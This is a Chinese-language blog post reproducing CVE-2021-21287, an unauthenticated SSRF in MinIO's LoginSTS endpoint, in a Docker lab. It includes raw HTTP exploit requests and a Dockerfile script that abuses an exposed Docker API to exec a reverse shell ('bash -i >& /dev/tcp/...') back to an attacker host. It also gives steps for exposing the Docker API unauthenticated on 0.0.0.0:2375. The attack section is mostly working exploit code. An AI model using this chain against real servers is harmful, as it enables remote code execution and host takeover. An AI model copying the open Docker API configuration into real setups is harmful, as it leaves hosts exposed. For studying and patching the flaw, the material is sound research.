![1612533374_601d4e7e7c4faab64d810.png!small](https://image.3001.net/images/20210205/1612533374_601d4e7e7c4faab64d810.png!small)

MinIO未授权SSRF漏洞(CVE-2021-21287)

## 一、漏洞简介

由于MinIO组件中LoginSTS接口设计不当，导致存在服务器端请求伪造漏洞

攻击者可以通过构造URL来发起服务器端请求伪造攻击成功利用此漏洞的攻击者能够通过利用服务器上的功能来读取、更新内部资源或执行任意命令

该漏洞无需用户验证即可远程利用

## 二、影响版本

MinIO < RELEASE.2021-01-30T00-20-58Z

## 三、环境准备&漏洞复现

Docker 安装 minio：

docker-compose.yml

    
    
    version: '3.7'
    services:
      minio1:
        image: minio/minio:RELEASE.2021-01-16T02-19-44Z
        volumes:
          - data1-1:/data1
          - data1-2:/data2
        ports:
          - "9000:9000"
        environment:
          MINIO_ACCESS_KEY: minio
          MINIO_SECRET_KEY: minio123
        command: server http://minio{1...4}/data{1...2}
        healthcheck:
          test: ["CMD", "curl", "-f", "http://localhost:9000/minio/health/live"]
          interval: 30s
          timeout: 20s
          retries: 3
    ## By default this config uses default local driver,
    ## For custom volumes replace with volume driver configuration.
    volumes:
      data1-1:
      data1-2:

启动环境：

![1612533374_601d4e7ecf91f9305a23a.png!small](https://image.3001.net/images/20210205/1612533374_601d4e7ecf91f9305a23a.png!small)

首页样式：

http://192.168.1.108:9000/minio/login

![1612533375_601d4e7f980265fb6cf3d.png!small](https://image.3001.net/images/20210205/1612533375_601d4e7f980265fb6cf3d.png!small)

1、验证SSRF

![1612533375_601d4e7ff4225d681a431.png!small](https://image.3001.net/images/20210205/1612533375_601d4e7ff4225d681a431.png!small)

具体数据包：

    
    
    POST /minio/webrpc HTTP/1.1
    Host: 192.168.1.104:1234
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Content-Type: application/json
    Connection: close
    Content-Length: 79
    {"id":1,"jsonrpc":"2.0","params":{"token":     "test"},"method":"web.LoginSTS"}

2、ssrf反弹shell

web服务下面放文件：index.php（apache）

反弹shell文件：

DockerFile如下：

    
    
    FROM alpine:3.13
    RUN apk add curl bash jq
    RUN set -ex && \
        { \
            echo '#!/bin/bash'; \
            echo 'set -ex'; \
            echo 'target="http://192.168.1.108:2375"'; \
            echo 'jsons=$(curl -s -XGET "${target}/containers/json" | jq -r ".[] | @base64")'; \
            echo 'for item in ${jsons[@]}; do'; \
            echo '    name=$(echo $item | base64 -d | jq -r ".Image")'; \
            echo '    if [[ "$name" == *"minio/minio"* ]]; then'; \
            echo '        id=$(echo $item | base64 -d | jq -r ".Id")'; \
            echo '        break'; \
            echo '    fi'; \
            echo 'done'; \
            echo 'execid=$(curl -s -X POST "${target}/containers/${id}/exec" -H "Content-Type: application/json" --data-binary "{\"Cmd\": [\"bash\", \"-c\", \"bash -i >& /dev/tcp/192.168.1.104/888 0>&1\"]}" | jq -r ".Id")'; \
            echo 'curl -s -X POST "${target}/exec/${execid}/start" -H "Content-Type: application/json" --data-binary "{}"'; \
        } | bash

具体操作数据包：

    
    
    POST /minio/webrpc HTTP/1.1
    Host: 192.168.1.104
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Content-Type: application/json
    Connection: close
    Content-Length: 79
    {"id":1,"jsonrpc":"2.0","params":{"token":     "test"},"method":"web.LoginSTS"}

为了好的展示录了一个小视频。

过程枯燥等待较长：加了一个BGM

![1612533376_601d4e80aaa0487be0ce2.png!small](https://image.3001.net/images/20210205/1612533376_601d4e80aaa0487be0ce2.png!small)

视频：

操作视频的结果：

https://mp.weixin.qq.com/s/9OavrcdczSZDXler5IpiQQ

注意⚠️：

因为自己Docker API已开启，过程未写入其中。

开启Docker API参考：

打开配置文件找到

    
    
    打开配置文件找到
    ExecStart=/usr/bin/dockerd 
    修改为
    ExecStart=/usr/bin/dockerd  -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock
    重启
    $ systemctl daemon-reload
    $ systemctl restart docker

![1612533377_601d4e81278b848f5acc4.png!small](https://image.3001.net/images/20210205/1612533377_601d4e81278b848f5acc4.png!small)

过程中还是很多坑需要去爬

